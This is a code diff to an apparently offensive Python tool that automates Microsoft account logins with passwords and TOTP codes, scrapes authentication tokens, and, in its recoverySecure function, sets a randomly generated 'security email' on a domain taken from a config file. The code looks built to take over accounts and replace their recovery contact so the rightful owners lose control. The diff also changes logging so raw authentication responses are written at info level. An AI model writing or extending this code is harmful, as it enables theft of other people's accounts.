@@ -1,10 +1,9 @@
-from securing.utils.generate_email import generate_email
-from securing.build_embeds import build_account_data
-from securing.utils.get_livedata import livedata
 from securing.auth.handle_redirects import handle_redirects
-from securing.utils.polish_host import polish_host
-from securing.utils.login_pwd import login_pwd
 from securing.auth.initial_session import get_session
+from securing.build_embeds import build_account_data
+from securing.utils.polish_host import polish_host
+from securing.utils.get_livedata import livedata
+from securing.utils.login_pwd import login_pwd
 from securing.utils.secure import secure
 from shared.gen_totp import totp
 
@@ -12,8 +11,11 @@ from database.database import DBConnection
 from time import time
 import logging
 import httpx
+import json
 import uuid
 import re
+
+config = json.load(open("config.json", "r"))
 
 async def login_authenticator(session: httpx.AsyncClient, email: str, data: dict, account: dict):
     initialTime = time()
@@ -30,7 +32,7 @@ async def login_authenticator(session: httpx.AsyncClient, email: str, data: dict
         live_data["ppft"]
     )
 
-    logging.debug(f"Password login response: {pwd_login}")
+    logging.info(f"Password login response: {pwd_login}")
     sFT_match = re.search(r'"sFT":"([^"]+)"', pwd_login)
     post_url_match = re.search(r'"urlPost":"(https://[^"]+)"', pwd_login)
     proof_match = re.search(r'"arrUserProofs":\[.*?"data":"(\d+)".*?"type":(?:10|14)', pwd_login, re.DOTALL)
@@ -66,10 +68,10 @@ async def login_authenticator(session: httpx.AsyncClient, email: str, data: dict
         },
         follow_redirects = True
     )
-    logging.debug(f"Auth login response: {auth_post.text}")
+    logging.info(f"Auth login response: {auth_post.text}")
 
     urlPost = re.search(r'"urlPost":"([^"]+)"', auth_post.text)
-    logging.debug(f"Extracted urlPost: {urlPost.group(1) if urlPost else 'None'}")
+    logging.info(f"Extracted urlPost: {urlPost.group(1) if urlPost else 'None'}")
     if not urlPost:
         msaauth = await handle_redirects(session, auth_post.text)
         if not msaauth:
@@ -115,7 +117,7 @@ async def recoverySecure(email: str, type: str, data: dict) -> dict:
     sname = uuid.uuid4().hex[:16]
     password = uuid.uuid4().hex[:12]
 
-    security_email = (await generate_email(sname, password))[1]
+    security_email = f"{sname}@{config["domain"]}"
     print(f"[+] - Generated Security Email ({security_email})")
 
     with DBConnection() as database:
